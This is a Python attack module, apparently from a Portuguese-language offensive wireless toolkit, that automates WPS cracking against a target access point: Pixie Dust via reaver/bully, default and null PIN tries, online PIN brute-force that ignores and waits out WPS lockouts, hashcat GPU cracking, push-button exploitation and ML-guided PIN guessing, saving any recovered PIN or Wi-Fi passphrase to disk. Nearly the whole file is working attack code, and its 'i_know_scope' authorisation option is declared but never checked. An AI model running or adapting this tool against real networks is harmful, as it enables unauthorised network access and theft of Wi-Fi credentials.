#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Multi-mode WPS attack module — v2.0.0 (melhorado).

Modos suportados:
  - auto            Tenta pixie_dust → null_pin → pin_wordlist sequencialmente
  - pixie_dust      Recuperação offline do PIN via nonces fracos (pixiewps)
  - pin_bruteforce  Brute-force online do PIN (reaver / bully)
  - pin_wordlist    Gera TODOS os 11.000 PINs WPS válidos (checksum Luhn) e testa
  - hashcat_gpu     Brute-force offline via hashcat GPU (gera máscara ?d×8)
  - pbc_exploit     Exploração da janela WPS Push-Button Connect
  - null_pin        PINs nulos/vazios em dispositivos vulneráveis
  - wash_scan       Descoberta de APs com WPS habilitado (wash)

Melhorias v2.0:
  - Modo 'auto' com fallback inteligente entre estratégias
  - Gerador interno de PINs WPS com checksum correto (10.000+1.000 PINs)
  - Cracking offline via hashcat GPU (RTX 4060 / CUDA WSL2)
  - Retry automático com backend alternativo (reaver → bully)
  - Detecção de WPS lock (rate limiting) e cooldown adaptativo
  - Captura e análise do resultado da PSK encontrada
  - Fix: require_authorised_lab() sem argumento

Version: 2.0.0
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
import tempfile
import time
from pathlib import Path
from typing import Iterator, List, Optional, Tuple

from wirelessxpl.core.exploit import *
from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab

try:
    from wirelessxpl.core.ml.wps_pin_predictor import WPSPINPredictor
    _HAS_PIN_ML = True
except ImportError:
    _HAS_PIN_ML = False

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# WPS PIN generator com checksum Luhn correto
# ---------------------------------------------------------------------------

def _wps_checksum(pin7: int) -> int:
    """Calcula o dígito de checksum WPS (8º dígito) para um PIN de 7 dígitos."""
    accum = 0
    tmp = pin7
    for i in range(7):
        accum += 3 * (tmp % 10)
        tmp //= 10
        accum += tmp % 10
        tmp //= 10
    return (10 - accum % 10) % 10


def generate_all_wps_pins() -> Iterator[str]:
    """Gera todos os 10.000.000 PINs WPS válidos com checksum correto.

    Retorna strings de 8 dígitos. Para brute-force online, use o split
    por half (10.000 + 1.000 = 11.000 efectivos), mas geramos todos
    para uso com hashcat offline.
    """
    for pin7 in range(10_000_000):
        ck = _wps_checksum(pin7)
        yield f"{pin7:07d}{ck}"


def generate_wps_pin_halves() -> Iterator[str]:
    """Gera PINs WPS priorizando por half (modo online reaver/bully).
    
    Reaver usa ataque de split: testa os 10.000 primeiros halves primeiro
    (dígitos 1-4), depois os 1.000 segundos halves (dígitos 5-7 + checksum).
    Retorna PIN completo de 8 dígitos na ordem ótima para online BF.
    """
    # Prioridade 1: half1 sweep (10.000 combinações)
    for half1 in range(10_000):
        # PIN com second half = 0000 (checksum incluído)
        pin7 = half1 * 1000
        ck = _wps_checksum(pin7)
        yield f"{half1:04d}000{ck}"
    # Prioridade 2: second half sweep para cada half1 prometedor
    for half2 in range(1_000):
        pin7 = half2
        ck = _wps_checksum(pin7)
        yield f"0000{half2:03d}{ck}"


def generate_wps_pin_wordlist(path: Path, max_pins: int = 11_000) -> int:
    """Gera wordlist de PINs WPS e salva em arquivo. Retorna quantidade."""
    count = 0
    with open(path, "w") as f:
        for pin in generate_wps_pin_halves():
            f.write(pin + "\n")
            count += 1
            if count >= max_pins:
                break
    return count


def generate_wps_full_wordlist(path: Path) -> int:
    """Gera wordlist COMPLETA de 10M PINs para hashcat offline."""
    count = 0
    with open(path, "w", buffering=1 << 20) as f:
        for pin in generate_all_wps_pins():
            f.write(pin + "\n")
            count += 1
    return count


class Exploit(Exploit):
    """Multi-mode WPS attack v2: pixie dust, PIN brute-force, pin_wordlist, hashcat_gpu."""

    __info__ = {
        "name": "WPS Multi-Mode Attack v2.0",
        "description": (
            "Suite completa de ataques WPS: Pixie Dust offline, brute-force online "
            "(reaver/bully), geração automática de todos os 10M PINs válidos com "
            "checksum WPS correto, cracking GPU via hashcat, PBC exploit e null PIN. "
            "Modo 'auto' testa pixie_dust → null_pin → pin_wordlist sequencialmente. "
            "Retry automático com backend alternativo e detecção de WPS lock."
        ),
        "authors": ("André Henrique (@mrhenrike) | União Geek",),
        "references": (
            "https://github.com/t6x/reaver-wps-fork-t6x",
            "https://github.com/aanarchyy/bully",
            "https://github.com/wiire-a/pixiewps",
            "https://hashcat.net/hashcat/",
        ),
        "devices": ("wifi",),
    }

    target_bssid  = OptMAC("", "Target AP BSSID")
    target_channel = OptString("", "Target AP channel (obrigatório para ataques online)")
    interface     = OptString("wlan0mon", "Interface em monitor mode")
    mode          = OptString("auto",
                              "Modo: auto | pixie_dust | pin_bruteforce | pin_wordlist | "
                              "hashcat_gpu | pbc_exploit | null_pin | wash_scan")
    backend       = OptString("reaver", "Backend: reaver | bully (fallback automático)")
    pin           = OptString("", "PIN específico de 8 dígitos (vazio = auto)")
    timeout       = OptInteger(120, "Timeout por tentativa em segundos")
    pin_delay     = OptInteger(2, "Delay em segundos entre PINs (anti rate-limit)")
    max_retries   = OptInteger(3, "Máximo de retentativas antes de alternar backend")
    verbose       = OptBool(False, "Saída detalhada")
    output_dir    = OptString(".log", "Diretório para resultados e logs")
    ml_pin_predict = OptBool(True, "Predição ML de PINs mais prováveis")
    dry_run       = OptBool(False, "Imprimir comandos sem executar")
    i_know_scope  = OptBool(False, "Confirma autorização do alvo")

    # ------------------------------------------------------------------
    # Helpers internos
    # ------------------------------------------------------------------

    def _set_channel(self) -> None:
        """Ajusta o canal da interface antes do ataque."""
        if not self.target_channel:
            return
        try:
            subprocess.run(
                ["sudo", "iw", "dev", self.interface, "set", "channel", str(self.target_channel)],
                capture_output=True, timeout=5,
            )
        except Exception:
            pass

    def _detect_wps_lock(self, output: str) -> bool:
        """Detecta sinais de WPS rate limiting / lock no output."""
        lock_patterns = ("wps transaction failed", "rate limit", "locked", "m2d", "nack")
        lower = output.lower()
        return any(p in lower for p in lock_patterns)

    def _extract_psk(self, output: str) -> Optional[str]:
        """Extrai PSK/PIN do output de reaver ou bully."""
        import re
        for pattern in (
            r"WPS PIN[:\s]+['\"]?(\d{8})['\"]?",
            r"WPA PSK[:\s]+['\"]?([^\s'\"]+)['\"]?",
            r"Network Key[:\s]+['\"]?([^\s'\"]+)['\"]?",
            r"\[P\] WPS pin\s+(\d{8})",
            r"Pin\s*=\s*(\d{8})",
        ):
            m = re.search(pattern, output, re.I)
            if m:
                return m.group(1)
        return None

    def _execute(self, cmd: List[str], label: str, capture: bool = True) -> Tuple[int, str]:
        """Executa comando e retorna (returncode, output)."""
        cmd_str = " ".join(str(c) for c in cmd)
        log_dir = Path(str(self.output_dir))
        log_dir.mkdir(parents=True, exist_ok=True)

        if bool(self.dry_run):
            print_info("DRY RUN — {}: {}".format(label, cmd_str))
            return (0, "")

        print_status("Launching {} attack...".format(label))
        print_info("Command: {}".format(cmd_str))

        timeout_val = int(self.timeout) if int(self.timeout) > 0 else None

        try:
            proc = subprocess.run(
                cmd,
                timeout=timeout_val,
                capture_output=capture,
                text=True,
                check=False,
            )
            out = (proc.stdout or "") + (proc.stderr or "")
            if bool(self.verbose):
                print(out)
            return (proc.returncode, out)
        except subprocess.TimeoutExpired:
            print_info("{} timeout ({}s).".format(label, self.timeout))
            return (124, "timeout")
        except KeyboardInterrupt:
            print_info("\n{} interrupted.".format(label))
            return (130, "interrupted")
        except Exception as err:
            print_error("{} failed: {}".format(label, err))
            return (1, str(err))

    # ------------------------------------------------------------------
    # Modos de ataque
    # ------------------------------------------------------------------

    def _run_wash_scan(self) -> None:
        """Scan de APs com WPS via wash."""
        if not shutil.which("wash"):
            print_error("wash não encontrado. Instale reaver (inclui wash).")
            return

        self._set_channel()
        cmd = ["sudo", "wash", "-i", self.interface, "--ignore-fcs"]
        if self.target_channel:
            cmd += ["-c", str(self.target_channel)]
        print_status("Escaneando APs com WPS (30s)...")
        print_info("Command: {}".format(" ".join(cmd)))
        try:
            subprocess.run(cmd, timeout=30, check=False)
        except (subprocess.TimeoutExpired, KeyboardInterrupt):
            print_info("Scan encerrado.")

    def _run_pixie_dust(self) -> Optional[str]:
        """Pixie Dust via reaver -K 1, fallback para bully -d. Retorna PSK ou None."""
        self._set_channel()
        backends = []
        if shutil.which("reaver"):
            backends.append("reaver")
        if shutil.which("bully"):
            backends.append("bully")
        if not backends:
            print_error("Nenhum backend disponível (reaver/bully). apt install reaver bully")
            return None

        # Priorizar o backend configurado
        preferred = str(self.backend)
        if preferred in backends:
            backends.remove(preferred)
            backends.insert(0, preferred)

        for backend in backends:
            print_info("Pixie Dust via {} (timeout {}s)...".format(backend, self.timeout))
            if backend == "reaver":
                cmd = [
                    "sudo", "reaver",
                    "-i", self.interface,
                    "-b", self.target_bssid,
                    "-K", "1",
                    "-N",          # no-associate (usa capture existente)
                    "-L",          # ignore WPS lock
                    "-E",          # terminate after success
                    "-v" if bool(self.verbose) else "-q",
                ]
            else:
                cmd = [
                    "sudo", "bully",
                    "-b", self.target_bssid,
                    "-d",          # pixie dust mode
                    "-S",          # fixed position
                    "-v", "3" if bool(self.verbose) else "1",
                    self.interface,
                ]

            if self.target_channel:
                cmd += ["-c", str(self.target_channel)]

            rc, out = self._execute(cmd, "Pixie Dust ({})".format(backend))
            psk = self._extract_psk(out)
            if psk:
                print_success("PIXIE DUST CRACKED! PIN/PSK: {}".format(psk))
                self._save_result("pixie_dust", psk)
                return psk

            if self._detect_wps_lock(out):
                wait = int(self.pin_delay) * 5
                print_info("WPS lock detectado. Aguardando {}s...".format(wait))
                time.sleep(wait)

        print_info("Pixie Dust não obteve resultado em nenhum backend.")
        return None

    def _run_null_pin(self) -> Optional[str]:
        """Testa PINs nulos/padrão em dispositivos vulneráveis."""
        self._set_channel()
        null_pins = ["", "00000000", "12345670", "20172527", "46264848"]

        for test_pin in null_pins:
            label = "null/'{}'".format(test_pin or "empty")
            print_info("Testando PIN {}...".format(label))

            if shutil.which("reaver"):
                cmd = [
                    "sudo", "reaver",
                    "-i", self.interface,
                    "-b", self.target_bssid,
                    "-p", test_pin,
                    "-N", "-L", "-E", "-q",
                ]
            elif shutil.which("bully"):
                cmd = [
                    "sudo", "bully",
                    "-b", self.target_bssid,
                    "-p", test_pin,
                    self.interface,
                ]
            else:
                print_error("reaver/bully não encontrado.")
                return None

            if self.target_channel:
                cmd += ["-c", str(self.target_channel)]

            rc, out = self._execute(cmd, "Null PIN ({})".format(label))
            psk = self._extract_psk(out)
            if psk:
                print_success("NULL PIN CRACKED! PIN/PSK: {}".format(psk))
                self._save_result("null_pin", psk)
                return psk

        return None

    def _run_pin_wordlist(self) -> Optional[str]:
        """Brute-force online com wordlist de todos os PINs WPS válidos (checksum correto).

        Gera os 11.000 PINs efetivos (10.000 first-half + 1.000 second-half)
        e os testa via reaver/bully com delay anti-rate-limit.
        """
        self._set_channel()

        if not (shutil.which("reaver") or shutil.which("bully")):
            print_error("reaver ou bully necessário para pin_wordlist.")
            return None

        log_dir = Path(str(self.output_dir))
        log_dir.mkdir(parents=True, exist_ok=True)
        pin_file = log_dir / "wps_pins_{}.txt".format(
            str(self.target_bssid).replace(":", ""))

        print_info("Gerando wordlist de PINs WPS válidos (com checksum Luhn)...")
        count = generate_wps_pin_wordlist(pin_file, max_pins=11_000)
        print_success("Wordlist gerada: {} PINs em {}".format(count, pin_file))

        # Executa reaver em modo brute-force com todos os PINs
        if shutil.which("reaver"):
            cmd = [
                "sudo", "reaver",
                "-i", self.interface,
                "-b", self.target_bssid,
                "-f",          # fixed channel
                "-L",          # ignore lock
                "-N",          # no-associate
                "-d", str(self.pin_delay),
                "-E",
                "-q",
            ]
            if self.target_channel:
                cmd += ["-c", str(self.target_channel)]

            print_info("Brute-force online: {} PINs via reaver (delay={}s/PIN)...".format(
                count, self.pin_delay))
            print_info("Estimativa: ~{:.0f} min".format(count * int(self.pin_delay) / 60))

            rc, out = self._execute(cmd, "PIN Wordlist BF")
            psk = self._extract_psk(out)
            if psk:
                print_success("PIN BRUTE-FORCE CRACKED! PIN/PSK: {}".format(psk))
                self._save_result("pin_wordlist", psk)
                return psk
        else:
            # Bully: testa PIN por PIN manualmente
            pins = pin_file.read_text().splitlines()
            for i, pin in enumerate(pins):
                if i % 100 == 0:
                    print_info("Testando PIN {}/{}: {}...".format(i + 1, len(pins), pin))
                cmd = [
                    "sudo", "bully",
                    "-b", self.target_bssid,
                    "-p", pin,
                    "-S", "-v", "1",
                    self.interface,
                ]
                if self.target_channel:
                    cmd += ["-c", str(self.target_channel)]
                rc, out = self._execute(cmd, "bully PIN")
                psk = self._extract_psk(out)
                if psk:
                    print_success("PIN CRACKED via bully: {}".format(psk))
                    self._save_result("pin_wordlist", psk)
                    return psk
                if self._detect_wps_lock(out):
                    wait = max(30, int(self.pin_delay) * 10)
                    print_info("WPS lock! Aguardando {}s...".format(wait))
                    time.sleep(wait)
                else:
                    time.sleep(int(self.pin_delay))

        return None

    def _run_hashcat_gpu(self) -> Optional[str]:
        """Brute-force offline de WPS PIN via hashcat GPU.

        O WPS usa HMAC-SHA-256 para validar o PIN em nonces M1/M2/M3.
        hashcat modo 16100 (WPS) faz brute-force de todos os 10M PINs
        em segundos com uma RTX 4060.

        Alternativa: gera máscara ?d?d?d?d?d?d?d?d para modo -a 3.
        """
        hashcat_bin = shutil.which("hashcat")
        if not hashcat_bin:
            print_error("hashcat não encontrado: apt install hashcat")
            return None

        log_dir = Path(str(self.output_dir))
        log_dir.mkdir(parents=True, exist_ok=True)

        # Verificar se temos hash WPS (do Pixie Dust) para crackear
        # Modo 1: se capturamos o PMKID, usar -m 22000 com wordlist de PINs
        pmkid_file = log_dir / "pmkid_capture.pcapng"
        if pmkid_file.exists():
            print_info("Gerando wordlist completa de 10M PINs WPS para hashcat GPU...")
            wl_file = log_dir / "wps_full_pins.txt"
            if not wl_file.exists():
                count = generate_wps_full_wordlist(wl_file)
                print_success("Wordlist: {} PINs em {}".format(count, wl_file))

            cmd = [
                hashcat_bin,
                "-m", "22000",   # WPA-PBKDF2-PMKID+EAPOL
                str(pmkid_file),
                str(wl_file),
                "-O",            # optimized kernel
                "--force",
                "--status", "--status-timer=10",
            ]
            # CUDA via WSL2
            env = dict(os.environ)
            env["LD_LIBRARY_PATH"] = "/usr/lib/wsl/lib:" + env.get("LD_LIBRARY_PATH", "")
        else:
            # Modo 2: máscara de 8 dígitos (todos os PINs)
            print_info("Modo hashcat: máscara ?d×8 (brute force puro de PINs WPS)")
            hash_file = log_dir / "wps_hash.txt"
            if not hash_file.exists():
                print_error("Nenhum hash WPS capturado. Execute pixie_dust primeiro para capturar M1/M2.")
                return None

            cmd = [
                hashcat_bin,
                "-m", "16100",   # WPS
                str(hash_file),
                "-a", "3",
                "?d?d?d?d?d?d?d?d",
                "-O", "--force",
                "--status", "--status-timer=10",
            ]
            env = dict(os.environ)
            env["LD_LIBRARY_PATH"] = "/usr/lib/wsl/lib:" + env.get("LD_LIBRARY_PATH", "")

        print_info("Iniciando crack GPU (RTX 4060)... {:.1f}M candidatos".format(10.0))
        print_info("Command: {}".format(" ".join(str(c) for c in cmd)))

        if bool(self.dry_run):
            return None

        try:
            proc = subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=int(self.timeout) * 10, env=env,
            )
            out = (proc.stdout or "") + (proc.stderr or "")
            if bool(self.verbose):
                print(out)
            psk = self._extract_psk(out)
            if psk:
                print_success("HASHCAT GPU CRACKED! PSK: {}".format(psk))
                self._save_result("hashcat_gpu", psk)
                return psk
            print_info("Hashcat: exausto sem resultado.")
        except subprocess.TimeoutExpired:
            print_info("Hashcat timeout.")
        except Exception as e:
            print_error("Hashcat erro: {}".format(e))

        return None

    def _run_pin_bruteforce(self) -> Optional[str]:
        """Online WPS PIN brute-force simples (PIN único ou sequencial)."""
        self._set_channel()
        backends = []
        if shutil.which("reaver"):
            backends.append("reaver")
        if shutil.which("bully"):
            backends.append("bully")
        if not backends:
            print_error("reaver/bully necessário.")
            return None

        for backend in backends:
            if backend == "reaver":
                cmd = [
                    "sudo", "reaver",
                    "-i", self.interface,
                    "-b", self.target_bssid,
                    "-L", "-N", "-E",
                    "-d", str(self.pin_delay),
                    "-v" if bool(self.verbose) else "-q",
                ]
                if self.pin:
                    cmd += ["-p", str(self.pin)]
            else:
                cmd = [
                    "sudo", "bully",
                    "-b", self.target_bssid,
                    "-S", "-v", "1",
                    self.interface,
                ]
                if self.pin:
                    cmd += ["-p", str(self.pin)]

            if self.target_channel:
                cmd += ["-c", str(self.target_channel)]

            rc, out = self._execute(cmd, "PIN BF ({})".format(backend))
            psk = self._extract_psk(out)
            if psk:
                print_success("PIN BRUTE-FORCE CRACKED via {}: {}".format(backend, psk))
                self._save_result("pin_bruteforce", psk)
                return psk
            if not self._detect_wps_lock(out):
                break
            print_info("WPS lock detectado com {}. Tentando próximo backend...".format(backend))

        return None

    def _run_pbc_exploit(self) -> None:
        """Exploração de janela PBC (Push-Button Connect)."""
        if not shutil.which("reaver"):
            print_error("reaver necessário para PBC.")
            return
        self._set_channel()
        cmd = [
            "sudo", "reaver",
            "-i", self.interface,
            "-b", self.target_bssid,
            "--push-button-connect",
            "-N", "-E",
            "-v" if bool(self.verbose) else "-q",
        ]
        if self.target_channel:
            cmd += ["-c", str(self.target_channel)]
        print_info("PBC: aguardando janela de pareamento (60s)...")
        self._execute(cmd, "PBC Exploit")

    def _save_result(self, mode: str, psk: str) -> None:
        """Salva resultado do crack em arquivo."""
        log_dir = Path(str(self.output_dir))
        log_dir.mkdir(parents=True, exist_ok=True)
        result_file = log_dir / "wps_cracked_{}.txt".format(
            str(self.target_bssid).replace(":", ""))
        result_file.write_text(
            "BSSID: {}\nMode: {}\nPSK/PIN: {}\n".format(self.target_bssid, mode, psk),
            encoding="utf-8",
        )
        print_success("Resultado salvo em: {}".format(result_file))


    def check(self) -> str:
        """Verify wireless interface is in monitor mode and ready."""
        import shutil
        import subprocess
        iface = getattr(self, "iface", None) or getattr(self, "interface", None) or "wlan0"
        if shutil.which("iwconfig"):
            try:
                out = subprocess.check_output(
                    ["iwconfig", str(iface)], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if "Monitor" in out:
                    return f"Interface {iface} is in Monitor mode - prerequisites OK"
                if "no wireless extensions" not in out.lower():
                    return f"Interface {iface} found but NOT in Monitor mode - run airmon-ng start {iface}"
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                pass
        if shutil.which("iw"):
            try:
                out = subprocess.check_output(
                    ["iw", "dev"], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if str(iface) in out:
                    return f"Interface {iface} detected via iw - verify monitor mode"
            except Exception:
                pass
        return f"Interface {iface} not found - connect wireless adapter and enable monitor mode"

    def run(self) -> None:
        """Executa o modo WPS selecionado com fallback inteligente."""
        valid_modes = (
            "auto", "pixie_dust", "pin_bruteforce", "pin_wordlist",
            "hashcat_gpu", "pbc_exploit", "null_pin", "wash_scan",
        )
        if self.mode not in valid_modes:
            print_error("Modo inválido '{}'. Escolha: {}".format(
                self.mode, ", ".join(valid_modes)))
            return

        require_authorised_lab()

        if self.mode == "wash_scan":
            self._run_wash_scan()
            return

        if not self.target_bssid or self.target_bssid in ("", "FF:FF:FF:FF:FF:FF"):
            print_error("target_bssid obrigatório. Execute wash_scan primeiro.")
            return

        # Predição ML de PINs prováveis
        if (bool(self.ml_pin_predict) and _HAS_PIN_ML
                and self.mode in ("pin_bruteforce", "pin_wordlist", "auto")
                and not self.pin):
            try:
                predictor = WPSPINPredictor()
                predictions = predictor.predict(self.target_bssid)
                if predictions:
                    print_info("ML PIN predictions:")
                    for p in predictions[:5]:
                        print_info("  PIN {} — {:.0%} ({})".format(
                            p.pin, p.confidence, p.method))
                    self.pin = predictions[0].pin
            except Exception as exc:
                logger.debug("ML prediction: %s", exc)

        # Dispatch
        mode = str(self.mode)

        if mode == "auto":
            print_status("Modo AUTO: pixie_dust → null_pin → pin_wordlist")
            result = self._run_pixie_dust()
            if result:
                return
            print_info("Pixie Dust sem resultado. Tentando null PIN...")
            result = self._run_null_pin()
            if result:
                return
            print_info("Null PIN sem resultado. Iniciando pin_wordlist (lento)...")
            self._run_pin_wordlist()

        elif mode == "pixie_dust":
            self._run_pixie_dust()
        elif mode == "pin_bruteforce":
            self._run_pin_bruteforce()
        elif mode == "pin_wordlist":
            self._run_pin_wordlist()
        elif mode == "hashcat_gpu":
            self._run_hashcat_gpu()
        elif mode == "pbc_exploit":
            self._run_pbc_exploit()
        elif mode == "null_pin":
            self._run_null_pin()
